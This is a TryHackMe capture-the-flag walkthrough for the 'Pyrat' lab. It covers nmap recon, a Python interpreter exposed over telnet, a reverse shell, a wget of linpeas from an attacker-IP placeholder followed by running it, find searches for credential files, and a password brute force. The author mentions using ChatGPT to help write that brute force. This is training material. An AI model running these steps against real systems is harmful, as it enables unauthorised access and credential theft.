TryHackMe – Pyrat | Full Walkthrough & Management Summary

🧠 Initial Recon: Scanning with Nmap

Before making assumptions, I launched a full version detection and OS scan:

nmap -A 10.10.16.135

Key Results:

    Port 22 (SSH): OpenSSH 8.2p1

    Port 8000 (HTTP-alt): Python SimpleHTTPServer 0.6 running Python 3.11.2

The absence of ports 80/443 hinted toward an unconventional interface. Given Python 3.11.2 was in play, I suspected potential RCE vectors or unsafe evals.
🌐 Web Exploration & Strange Message

Navigating to http://10.10.16.135:8000 resulted in the message:

    “Try a more basic connection!”

Curl and Burp Suite provided no additional information. Every request returned the same message. So, I pivoted to more primitive protocols.
📟 Telnet to the Rescue

Telneting to the same port gave more dynamic responses. Python-style input errors suggested an interpreter was being exposed directly. With a bit of trial and error, I crafted a minimal reverse shell payload without using python -c, and finally got a working connection.
⚙️ Shell Access & Enumeration

The reverse shell was unstable and had minimal privileges, but by pivoting directories away from /root to /home, I was able to escalate my view. Using linpeas.sh via a temporary Python HTTP server, I began enumerating the environment.

python3 -m http.server 80
wget http://<attacker_ip>/linpeas.sh -O /tmp/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

🗃️ Discovering Sensitive Files

A manual search using find revealed interesting files:

find / -iname "*cred*" 2>/dev/null
find / -iname "*config*" 2>/dev/null

Eventually, /opt/ held a Git repo containing a deleted script: pyrat.py.old.

Using Git commands, I restored the deleted file:

git checkout pyrat.py.old

🔓 Privilege Escalation to Root

The restored Python file hinted at an admin-only endpoint accessible via Telnet. But to access it, a password was required.
✅ Bruteforcing via Custom Script

Telnet made scripting complex, as the ‘admin’ string had to be sent before any password prompt. After multiple iterations and leveraging ChatGPT to assist with logic, I crafted a custom brute-force script that uncovered the password and authenticated successfully.
